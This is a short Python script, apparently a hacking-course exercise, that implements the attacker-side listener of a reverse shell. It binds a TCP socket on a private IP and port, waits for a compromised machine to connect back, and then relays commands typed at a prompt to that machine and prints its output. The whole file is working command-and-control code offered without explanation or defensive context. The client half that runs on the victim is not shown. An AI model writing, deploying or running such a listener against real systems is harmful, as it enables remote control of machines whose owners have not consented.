#!/usr/bin/python3
import socket

class Listner:
    def __init__(self,ip,port):
        listner = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        listner.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
        listner.bind((ip,port))
        listner.listen(0)
        print("[+] Waiting for incomming connections")
        self.conn,addr = listner.accept()
        print("[+] Got a connection from",addr )

    def execute_remotely(self,command):
        self.conn.send(command.encode('ascii'))
        return self.conn.recv(1024).decode('ascii')

    def run(self):
        while(True):
            command = input(">> ")
            result = self.execute_remotely(command)
            print(result)


my_listener = Listner("192.168.1.7",1234)
my_listener.run()




